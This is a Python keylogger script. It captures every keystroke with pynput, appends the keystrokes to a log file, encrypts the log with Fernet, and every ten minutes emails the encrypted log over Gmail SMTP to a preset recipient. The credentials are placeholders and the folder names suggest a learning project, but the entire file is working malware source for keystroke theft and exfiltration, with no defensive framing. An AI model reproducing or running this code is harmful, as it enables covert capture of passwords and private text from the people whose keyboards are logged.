# Required Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
import threading
import time

# Configurable Constants
KEYS_INFORMATION = "key_log.txt"
ENCRYPTED_KEYS_INFORMATION = "key_log_encrypted.txt"
DECRYPTED_KEYS_INFORMATION = "key_log_decrypted.txt"
KEY_FILE = "encryption_key.key"
FILE_PATH = "D:\\cyber_security_stuff\\cyber_projects\\keylogger\\python_project\\project\\"
KEY_THRESHOLD = 10  # Write to file after every 10 keys
TIMER_INTERVAL = 600  # Time interval in seconds (e.g., 600 seconds = 10 minutes)
EMAIL_ADDRESS = "your_email@example.com"  # Replace with your email
EMAIL_PASSWORD = "your_password"  # Replace with your email password
RECIPIENT_EMAIL = "recipient_email@example.com"  # Replace with the recipient's email

# Global Variables
keys = []
count = 0
stop_flag = False  # Used to stop the timer thread when the keylogger exits

# Function to generate or load an encryption key
def load_encryption_key():
    key_path = os.path.join(FILE_PATH, KEY_FILE)
    if not os.path.exists(key_path):
        # Generate and save the key if it doesn't exist
        key = Fernet.generate_key()
        with open(key_path, "wb") as key_file:
            key_file.write(key)
        print(f"Encryption key generated and saved at {key_path}")
    else:
        print(f"Encryption key loaded from {key_path}")
    with open(key_path, "rb") as key_file:
        return key_file.read()

# Function to encrypt the log file
def encrypt_file(file_path, output_path, key):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(data)
        with open(output_path, "wb") as f:
            f.write(encrypted_data)
        print(f"File encrypted and saved to {output_path}")
    except Exception as e:
        print(f"Error encrypting file: {e}")

# Function to decrypt an encrypted file
def decrypt_file(encrypted_path, output_path, key):
    try:
        with open(encrypted_path, "rb") as f:
            encrypted_data = f.read()
        fernet = Fernet(key)
        decrypted_data = fernet.decrypt(encrypted_data)
        with open(output_path, "wb") as f:
            f.write(decrypted_data)
        print(f"File decrypted and saved to {output_path}")
    except Exception as e:
        print(f"Error decrypting file: {e}")

# Function to send email with the encrypted log file
def send_email():
    try:
        encrypted_file_location = os.path.join(FILE_PATH, ENCRYPTED_KEYS_INFORMATION)

        # Create email message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = RECIPIENT_EMAIL
        msg['Subject'] = "Encrypted Keylogger Log File"
        msg.attach(MIMEText("Please find the attached encrypted key log file.", 'plain'))

        # Attach the encrypted file
        with open(encrypted_file_location, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header(
            'Content-Disposition',
            f'attachment; filename={ENCRYPTED_KEYS_INFORMATION}'
        )
        msg.attach(part)

        # Send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)
        server.quit()

        print("Encrypted log file emailed successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to write keys to a file
def write_file(keys):
    try:
        file_location = os.path.join(FILE_PATH, KEYS_INFORMATION)
        with open(file_location, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "space" in k:  # Log a newline for space
                    f.write("\n")
                elif "Key" not in k:  # Ignore special keys like Shift, Ctrl
                    f.write(k)
        print(f"Keys written to file: {file_location}")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Timer function for periodic encryption and email sending
def periodic_task():
    global stop_flag
    while not stop_flag:
        time.sleep(TIMER_INTERVAL)

        # Encrypt the log file
        key = load_encryption_key()
        log_file_path = os.path.join(FILE_PATH, KEYS_INFORMATION)
        encrypted_log_file_path = os.path.join(FILE_PATH, ENCRYPTED_KEYS_INFORMATION)
        encrypt_file(log_file_path, encrypted_log_file_path, key)

        # Send the encrypted log file via email
        send_email()

# Function triggered on key press
def on_press(key):
    global keys, count

    try:
        print(f"Key pressed: {key}")
        keys.append(key)
        count += 1

        if count >= KEY_THRESHOLD:  # Write after threshold is reached
            count = 0
            write_file(keys)
            keys.clear()
    except Exception as e:
        print(f"Error in on_press: {e}")

# Function triggered on key release
def on_release(key):
    if key == Key.esc:  # Exit on ESC key
        print("Exiting keylogger...")
        global stop_flag
        stop_flag = True  # Stop the timer thread
        return False

# Main Listener Setup
if __name__ == "__main__":
    try:
        print("Starting keylogger... Press ESC to exit.")

        # Start the periodic task in a separate thread
        timer_thread = threading.Thread(target=periodic_task)
        timer_thread.daemon = True
        timer_thread.start()

        # Start the keylogger listener
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        # Decrypt the log file (manual step after keylogger finishes)
        key = load_encryption_key()
        encrypted_log_file_path = os.path.join(FILE_PATH, ENCRYPTED_KEYS_INFORMATION)
        decrypted_log_file_path = os.path.join(FILE_PATH, DECRYPTED_KEYS_INFORMATION)
        decrypt_file(encrypted_log_file_path, decrypted_log_file_path, key)

    except Exception as e:
        print(f"Error initializing keylogger: {e}")
